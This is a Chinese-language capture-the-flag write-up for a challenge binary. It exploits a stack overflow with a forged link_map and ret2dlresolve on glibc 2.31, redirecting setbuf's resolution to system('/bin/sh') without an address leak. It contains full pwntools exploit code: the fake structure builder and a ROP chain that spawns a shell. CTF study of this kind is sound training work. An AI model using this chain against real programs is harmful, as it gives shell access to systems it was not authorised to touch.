# No way to leak

## 题目简述

程序存在栈溢出和足够的 ROP gadgets，但没有可用的信息泄露，ASLR 下不能直接计算 libc 基址。题目使用 glibc 2.31，可构造 fake `link_map` 并从 PLT0 进入动态链接器的 `_dl_runtime_resolve`：借助已经解析的 `setbuf@got` 和已知的符号偏移差 `system - setbuf`，让解析器最终跳转到 `system("/bin/sh")`。

## 解题过程

### 关键机制

正常 lazy binding 会根据 `link_map` 中的动态段指针找到：

- `DT_JMPREL`：重定位表；
- `DT_SYMTAB`：符号表；
- `DT_STRTAB`：字符串表；
- `l_addr`：模块装载基址修正量。

本题不伪造完整 ELF，只布置解析路径实际读取的字段。令 fake `l_addr = system - setbuf`，再让 fake symtab 关联到已解析的 `setbuf@got` 附近，解析器计算出的目标就会偏移到 `system`。该布局与 glibc/loader 版本强相关，不能无条件套到其它版本。

### fake link_map

```python
from pwn import ELF, context, flat, p64, process

context(os="linux", arch="amd64")

io = process("./pwn")
elf = ELF("./pwn", checksec=False)
libc = ELF("./libc-2.31.so", checksec=False)

read_plt = elf.plt["read"]
setbuf_got = elf.got["setbuf"]
fake_addr = 0x404180

pop_rdi = 0x40115E
pop_rsi_r15 = 0x401160  # pop rsi; pop r15; ret
ret = 0x40101A
plt_resolver = 0x401026  # PLT0 中接收 link_map 与 reloc_arg 的入口

symbol_delta = libc.sym["system"] - libc.sym["setbuf"]
MASK64 = (1 << 64) - 1


def build_fake_link_map(base: int, known_got: int, delta: int) -> bytes:
    blob = p64(delta & MASK64)       # +0x00: fake l_addr
    blob += p64(0)                   # +0x08: 动态段占位
    blob += p64(base + 0x18)         # +0x10: 指向 fake Rela

    # +0x18: fake Elf64_Rela
    blob += p64((base + 0x30 - delta) & MASK64)  # r_offset
    blob += p64(0x7)                 # r_info: symbol index 0, JUMP_SLOT
    blob += p64(0)                   # r_addend

    blob += p64(0)                   # +0x30: l_ns/占位
    blob += p64(0)                   # +0x38: 动态项占位
    blob += p64(known_got - 0x8)     # +0x40: fake symtab 基址
    blob += b"/bin/sh\x00"          # +0x48: system 参数

    blob = blob.ljust(0x68, b"A")
    blob += p64(base)                # +0x68: DT_STRTAB 指针
    blob += p64(base + 0x38)         # +0x70: DT_SYMTAB 指针
    blob = blob.ljust(0xF8, b"A")
    blob += p64(base + 0x08)         # +0xF8: DT_JMPREL 指针
    return blob


fake_link_map = build_fake_link_map(fake_addr, setbuf_got, symbol_delta)
```

### ROP 调用

第一段 ROP 调用 `read(0, fake_addr, ...)` 写入伪结构，然后把 `/bin/sh` 地址放入 `rdi`，从 PLT0 解析入口进入动态链接器。`pop rsi; pop r15; ret` 必须同时提供 `r15` 占位；原始题解若少这一项，后续地址会被错当作寄存器值。

```python
payload = flat(
    b"A" * 120,
    pop_rdi,
    0,
    pop_rsi_r15,
    fake_addr,
    0,                   # r15 占位
    read_plt,
    ret,                 # 调整后续调用的栈对齐
    pop_rdi,
    fake_addr + 0x48,
    plt_resolver,
    fake_addr,           # fake link_map
    0,                   # reloc_arg
)

io.send(payload)
io.send(fake_link_map)
io.interactive()
```

该链还依赖进入溢出点时 `rdx` 保留了足够大的读取长度；若目标上下文不满足，应另找 gadget 显式设置 `rdx`。

## 方法总结

- 核心技巧：在无泄露条件下伪造 `link_map`/动态段字段，复用 PLT0 和已解析 GOT 符号完成运行时解析。
- 识别信号：可控栈、可写内存、PLT0、已解析函数 GOT 和匹配 loader/libc 同时存在，而 ASLR 阻止直接 ret2libc 时，可考虑 ret2dlresolve/fake link_map。
- 复用要点：结构偏移、`_dl_fixup` 检查和可用 gadgets 随 glibc 版本变化；必须对 bundled loader 调试验证，并逐个核对多 pop gadget 的占位与调用栈对齐。
